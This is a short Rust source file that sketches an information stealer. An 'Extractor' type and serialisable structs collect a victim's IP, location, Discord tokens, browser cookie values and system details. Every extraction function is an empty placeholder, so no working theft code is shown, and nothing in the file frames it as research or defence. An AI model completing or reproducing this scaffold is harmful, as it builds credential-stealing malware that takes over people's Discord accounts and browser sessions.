use regex::Regex;
use std::path::Path;
use std::fs;
use serde::{Deserialize, Serialize};

pub struct Extractor {
    // Configuration de l'extracteur
}

#[derive(Serialize, Deserialize, Default)]
pub struct ExtractedData {
    ip: String,
    location: String,
    tokens: Vec<String>,
    system_info: SystemInfo,
    timestamp: u64,
    #[serde(default)]
    browser_cookies: Vec<BrowserCookie>,
}

#[derive(Serialize, Deserialize, Default)]
pub struct BrowserCookie {
    domain: String,
    name: String,
    value: String,
    path: String,
    expires: u64,
}

#[derive(Serialize, Deserialize, Default)]
pub struct SystemInfo {
    #[serde(default)]
    user_agent: Option<String>,
    os: String,
    cpu: String,
    #[serde(default)]
    gpu: Option<String>,
    ram: u64,
}

impl Extractor {
    pub fn new() -> Self {
        Extractor {}
    }

    pub fn extract_discord_tokens(&self) -> Vec<String> {
        // Placeholder
        Vec::new()
    }

    pub fn extract_browser_data(&self) -> Vec<BrowserCookie> {
        // Placeholder
        Vec::new()
    }

    pub fn collect_system_info(&self) -> SystemInfo {
        // Placeholder
        SystemInfo::default()
    }

    fn find_discord_storage_location(&self) -> Option<String> {
        // Placeholder
        None
    }
}
